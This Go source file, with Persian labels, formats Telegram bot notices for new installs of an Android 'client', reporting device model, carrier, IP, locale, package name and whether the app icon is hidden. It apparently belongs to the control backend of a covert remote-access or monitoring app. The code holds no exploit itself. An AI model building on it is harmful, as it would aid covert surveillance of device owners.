package telegram

import (
	"fmt"
	"html"
	"strings"

	"github.com/base/realtime/internal/protocol"
	"github.com/base/realtime/internal/store"
)

type InstallNotice struct {
	Port        store.Port
	User        store.UserProfile
	Device      store.ClientDevice
	UserID      string
	DeviceID    string
	BotUsername string
	Reinstall   bool
}

func iconStateLabel(state string) string {
	switch strings.ToLower(strings.TrimSpace(state)) {
	case "hidden":
		return "مخفی"
	case "changed":
		return "عوض‌شده"
	default:
		return "معمولی"
	}
}

func deviceTitle(c protocol.ClientInfo) string {
	parts := make([]string, 0, 2)
	if m := strings.TrimSpace(c.Manufacturer); m != "" {
		parts = append(parts, m)
	}
	if m := strings.TrimSpace(c.Model); m != "" {
		parts = append(parts, m)
	}
	if len(parts) == 0 {
		if m := strings.TrimSpace(c.Device); m != "" {
			return m
		}
		return "—"
	}
	return strings.Join(parts, " ")
}

// field formats a RTL-safe label/value line for Telegram HTML.
// LTR mark keeps IPs, UUIDs and package names from scrambling the line.
func field(label, value string) string {
	value = strings.TrimSpace(value)
	if value == "" {
		value = "—"
	}
	return "<b>" + html.EscapeString(label) + "</b>: \u200E" + html.EscapeString(value)
}

func fieldOpt(label, value string) string {
	if strings.TrimSpace(value) == "" {
		return ""
	}
	return field(label, value)
}

func joinLines(parts ...string) string {
	out := make([]string, 0, len(parts))
	for _, part := range parts {
		if part == "" {
			continue
		}
		out = append(out, part)
	}
	return strings.Join(out, "\n")
}

func InstallNoticeHTML(n InstallNotice) string {
	c := n.Device.Client
	operator := strings.TrimSpace(c.Operator)
	if operator == "" {
		operator = strings.TrimSpace(c.SimOperator)
	}
	android := strings.TrimSpace(c.AndroidRelease)
	if android != "" && c.Sdk > 0 {
		android = fmt.Sprintf("%s (API %d)", android, c.Sdk)
	}
	locale := strings.TrimSpace(c.Locale)
	if tz := strings.TrimSpace(c.TimeZone); tz != "" {
		if locale != "" {
			locale += " · "
		}
		locale += tz
	}
	portName := strings.TrimSpace(n.Port.Name)
	if code := strings.TrimSpace(n.Port.Code); code != "" {
		if portName != "" {
			portName += " · " + code
		} else {
			portName = code
		}
	}

	var head string
	if n.Reinstall {
		head = "📲 <b>نصب مجدد کلاینت</b>\nاین کاربر قبلاً برای این پورت نصب کرده بود"
	} else {
		head = "📲 <b>نصب کلاینت جدید</b>"
	}

	body := joinLines(
		head,
		"",
		field("نام اپ", c.AppLabel),
		field("مدل", deviceTitle(c)),
		field("آیکن", iconStateLabel(c.IconState)),
		field("اپراتور", operator),
		field("IP", n.Device.ClientIP),
		field("پورت", portName),
		field("نام کاربر", n.User.DisplayName),
		fieldOpt("توضیحات", n.User.Description),
		field("شناسه کاربر", n.UserID),
		field("شناسه دستگاه", n.DeviceID),
		field("اندروید", android),
		field("زبان", locale),
		fieldOpt("پکیج", c.PackageName),
	)
	token := strings.TrimSpace(n.User.SetToken)
	if token == "" {
		return body
	}
	return body + SetCommandFooter(token)
}

func SetupNoticeHTML() string {
	return "✅ <b>فعال‌سازی کامل شد</b>\nاین دستگاه برای کار مداوم آماده است."
}

// SetCommandFooter is the shared set-command block under install / user specs.
func SetCommandFooter(setToken string) string {
	token := strings.TrimSpace(setToken)
	if token == "" {
		return ""
	}
	return "\n──────────────\n<b>دستور تنظیم</b>:\n<code>/set_" + html.EscapeString(token) + "</code>"
}

const ManageUserButtonText = "👤 مدیریت کاربر"

func InstallManageURL(botUsername, setToken string) string {
	user := strings.TrimPrefix(strings.TrimSpace(botUsername), "@")
	token := strings.TrimSpace(setToken)
	if user == "" || token == "" {
		return ""
	}
	return "https://t.me/" + user + "?startapp=u_" + token
}

func ManageUserKeyboard(botUsername, setToken string) map[string]any {
	url := InstallManageURL(botUsername, setToken)
	if url == "" {
		return nil
	}
	return map[string]any{
		"inline_keyboard": []any{
			[]any{map[string]any{"text": ManageUserButtonText, "url": url}},
		},
	}
}

func InstallNoticeKeyboard(n InstallNotice) map[string]any {
	return ManageUserKeyboard(n.BotUsername, n.User.SetToken)
}
